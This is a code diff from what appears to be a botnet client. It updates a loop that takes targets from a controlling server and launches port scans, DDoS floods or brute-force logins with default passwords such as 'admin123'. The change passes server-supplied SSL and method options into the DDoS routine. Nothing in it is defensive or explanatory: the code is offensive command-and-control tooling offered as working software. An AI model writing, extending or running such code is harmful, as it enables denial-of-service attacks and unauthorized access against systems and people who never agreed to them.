@@ -77,13 +77,12 @@ def perform_ddos_attack(ip):
 
 
 
-def perform_ddos_attack(target_ip, target_port=80, method=None):
-    ssl = False
+def perform_ddos_attack(target_ip, target_port=80, additional_info={}):
+    ssl = additional_info.get("ssl", False)
+
+    method = additional_info.get("method", None)
     
-    if target_port == 443:
-        ssl = True
-        
-    ddos(target_ip, target_port, ssl)
+    ddos(target_ip, target_port, ssl, method)
 
 
 def perform_bruteforce_attack(ip, username, password_list):
@@ -103,6 +102,7 @@ while True:
         target_type = target_response["type"]
         target_port = target_response["port"]
         target_priority = target_response["priority"]
+        additional_info = target_response["additional_info"]
 
         print(f"Received target: IP - {target_ip}, Type - {target_type}, Port - {target_port}, Priority - {target_priority}")
 
@@ -114,7 +114,7 @@ while True:
             available_ports = perform_port_scan(target_ip, 1, 1024)
             print(f"Available ports: {available_ports}")
         elif target_type == 1:
-            perform_ddos_attack(target_ip)
+            perform_ddos_attack(target_ip, target_port, additional_info)
         elif target_type == 2:
             perform_bruteforce_attack(target_ip, "admin", ["password123", "admin123"])
         elif target_type == 3:
